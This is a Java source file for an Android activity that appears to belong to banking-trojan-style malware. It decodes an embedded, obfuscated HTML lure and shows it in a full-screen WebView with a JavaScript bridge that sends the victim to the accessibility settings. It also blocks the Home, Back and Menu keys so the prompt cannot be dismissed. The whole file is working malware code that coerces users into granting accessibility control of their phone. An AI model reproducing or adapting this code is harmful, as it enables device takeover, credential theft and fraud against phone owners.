package com.example.mmm.Activity;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.app.Activity;
import android.provider.Settings;
import android.util.Base64;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.JavascriptInterface;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.example.mmm.Utils.utils;
import com.example.mmm.constants;

import java.util.Locale;

public class actToaskAccessbility extends Activity {

    utils utl = new utils();
    constants consts = new constants();
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
     //   setContentView(R.layout.activity_alert_accessbility);
                utl.SettingsWrite(getApplicationContext(),consts.activityAccessibilityVisible,consts.str_null);
                WebView wv = new WebView(this);
                wv.getSettings().setJavaScriptEnabled(true);
                wv.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
                wv.setWebViewClient(new actToaskAccessbility.MyWebViewClient());
                wv.setWebChromeClient(new actToaskAccessbility.MyWebChromeClient());
                wv.addJavascriptInterface(new WebAppInterface(this), consts.string_1);
                String base64 = consts.base64HtmlAccessibilityCusom;

                try {
                    byte[] data = Base64.decode(base64, Base64.DEFAULT);
                    base64 = new String(data, consts.strUTF_8);
                    base64 = base64.replace(consts.string_3 ,  consts.strAccessbilityService);
                    base64 = base64.replace(consts.string_4, utl.localeTextAccessibility() + consts.str + consts.string_5 + consts.strAccessbilityService + consts.string_5);
                    base64 = base64.replace(consts.string_10,consts.string_11 +  Locale.getDefault().getLanguage() + consts.string_5);
                    base64 = base64.replace(consts.string_142, consts.string_143 + Locale.getDefault().getLanguage() + consts.string_144);

                   // wv.loadData(base64, consts.string_2, consts.strUTF_8);
                    wv.loadDataWithBaseURL(null,base64, consts.string_2, consts.strUTF_8, null);
                    setContentView(wv);
                }catch (Exception ex){
                 //   utl.SettingsToAdd(this, consts.LogSMS , consts.string_145 + ex.toString() + consts.string_119);
                }


    }
    public class WebAppInterface {
        Context mContext;

        WebAppInterface(Context c) {
            mContext = c;
        }
        @JavascriptInterface
        public void returnResult() {
            utl.SettingsWrite(getApplicationContext(),consts.activityAccessibilityVisible,consts.str_1);
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        }
    }

    private class MyWebViewClient extends WebViewClient {
        @Override
        public void onPageFinished (WebView view, String url){
        }
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            return false;
        }
    }

    private class MyWebChromeClient extends WebChromeClient {

        @Override
        public boolean onJsAlert(WebView view, String url, String message, JsResult result) {
            return true;
        }
    }

    @Override
    protected void onStop() {
        super.onStop();
    }
    @Override
    public void onDestroy(){
        super.onDestroy();
    }
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_HOME) {
            return true;
        }
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            return true;
        }
        if (keyCode == KeyEvent.KEYCODE_MENU) {
            return true;
        }
        return false;
    }
    @Override
    public void onBackPressed() {
        super.onBackPressed();
    }
}

